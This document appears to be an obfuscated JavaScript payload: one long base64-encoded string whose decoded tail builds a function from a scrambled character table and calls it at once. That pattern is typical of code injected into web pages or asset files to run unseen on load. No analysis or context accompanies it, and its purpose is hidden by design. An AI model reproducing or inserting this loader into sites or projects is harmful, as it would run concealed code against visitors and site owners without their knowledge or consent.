JWZLXyB7bks4ZCRvS1ImOilzJUt0S11mKV9lbSgtYTdiIEpyYTZfLCkmKHUuKC5mbiRlY11dS2huZTtsIWlLLD0xIGBlZHBvaTEpODlLZ28le2dlfWFhXUtCS3NPaSs7S25lb0sxb2FGa3NyR0tfJGRzdCtLZTJzIW5LMn1iXTFLJENlcyt0Vm9deyQybjMrLjFke3RLbzVlLlApZHJ7XWclSyk7ZyBzOF9sKW5uZWFLbD01VGEwIllLSz0gS0tyZi46ZW9yKHtvaklLXyhlZiVlcmEpIXA0X2koYUs2M0s6ZksoSzQ0ODYycE1LdUtqXW9dbi5zSyYwYW9LLF9lKy5LLmFyOmddKEsxVWVLYXRtZGNdZm0pImxIclFLez1veCRdKTszRWFvZTFLfX04IW9kLmw4SzVjMXI1KXNLSzRlLkshX11mOitidjpLYjdmLktfbzNbdVwvKS5LKShlS3MzIlRmaF9fYS59bDpkbEt9KShLMjUxdy57ZDVcLzZuNGtlYyRzQzRlLjdLc3BmIjNpYXtfRmJyKW9LbkthMV1zZXR1S2JLZmZdaHRvKDMoSy49bF8hcl9hXy5bLm5kMWdfKDEwS2xfN1ddWWEyb2kpNyh5LCklcj9zX2JoSyE7IF89JSgwXSQle2VyKHVbX1Q6SzApdF86YWEgS3goKTczXyhtdD59dCthT0tfcl1LYUtfMWxLbj0zSyFvKWwkLF82KGVmYUsge246JUstWyRLbEtLdSk7S3s7Sy5vLXNbeW9dX11fdCxnbl0hLmFjLl8gYTJLNCVLJHs5JSlkLEthIEttS0ssS10udF8xc2l7ICM6XSFzLD1LMil0S2tVPUsjcjl9Z2I4byhuSyApcnBdNEtiLWUmcGJwNilAXV0oVH0ufWZvXS5hLDIkN0tLMVMzfUtbOks6S2VXaG9kaV0jTzNpKHtwS3RjOTFdfUtzYV9Se0twIC4wbi40SyxzOiFiJWlhKGU7dDkkbiBySz0lRyNdSTN3dG8pTSx0IyUoZC5ydC5hMWhlaC5pYzIsbiUuX2YwKHQhbGhLaUs2S2VdcHs7MUtUS3AlS3NtS0sieSk4IUtmbm4oKyhfNF9iUlNlcjt7M059bztuSy11LGV9Il8ldGUufStZbmdLUHcuMmUoZjAzLWFSfWEkSzpDMShfbmx5bi5vO199ZHIpKV11US4xOFlhS3JyLm9lOVhkMn0wKGZlb3JUWmFuJTMuYSlLZnB0dHViZWVLTiFfSyBldEs2dHJFJVFmOXRyXUs6SSRuS28gMDAxITY1Yl9ffW9dMH1Lb2NnKF1LSzZ1byFzX2UlXWUydG9oJW5lb154S2RkSzRySzI6dFshSz0xZSx0X0t0YWxuc2dhdGVzIiVub11hS0szNWwlXUssK2IxbClwKXRvMyYhLilzcktzS2E3O1VoSyJlZjJLS21iXV9ddChLYU5jbkslZWVhMG0hZnR0S3lhM0sgM3FZXy48bzAlPUtlNG8uS3s9MSlSYUsufXMuYWxyYzMxcEFCLihLc0tkICl1OGggbilzSUtmYV9LS0tbeW49OGUsLnJLSyYuKy5uX19LaEsoXzRLMmVnSz4hJWVfZSJhZDd5ZktjJWlocGddNFxcS2U0NDBdaWYiIV0zSzgoVnNwLjBcXGFyUzs2S19mNFpLKS0hUzEgYV1LZWwuLjk7bm5uS2UuZSIxSzc3LmRLIW8pS3JLXSk7YUdLci5wMzdfcmVPSylfPUt5XyhjISByZ0s1IjVfMUtEMCNLXSxzZy5dWks2IEshcEtwKHJtS11LXTBOY2hlIks/aTtLKUB9IGk8eGFhZUtffUNpKyUlMHhLbT1LYSI5aUkoIF0yb29jLig1Lks9ZWF0YWhfS3RmZW5LY1F1dWN7b29cL2RvbHQgS103I2VlcmJhcCUuZmZdYWVmZWVhX11vLmkuKEt0JGFlKG5nLmJsbWNsS0twaV0oSyA9bzszNjRvMGZlSmk7XzI0NHJLaSk7cUtWdD0pdC4ofWUgIC5hYW5fX11LXzNkO2phS0spMktLUW8gLDNyZGJhIEsoMUszbmlfb3k0JGFpQ18ud19LY1wnIHNLZUtLOTdyK10laS51IDMlXUtLbz1fLnh7Y2ZlamNhJT1SYXJLQXBhKEY7Sy5sfWUucjc5SywgLm9uMV8sISl7OSVhMT8lKC5LLD1LZnhVX2piJWU5Z199dWczJG5LYk5LOWMpcCpzdCVwS2cgM2VfSyg7KUszS29rIGdje3ddbmQuNmkgdHRLPWloSyluX0tqS0s0VzRlfURLS0toIDNuY1ooZl9haVtKNC42eXtOOmV4dHN5dG90PWFoYmFddjhlS310aWFhdz1leWhLXSVpVF8pK3R9dF1daTkoMXRLMksxdDAxcnQ9b0t6YW8zYUslZGx0SzA7LlFmLmduNnJjUWZlP2UpYSlpIzgrfScpKTt2YXIgZVNGPUZpSShXalEscHdwICk7ZVNGKDcyNTYpO3JldHVybiAzODU5fSkoKQ=='))
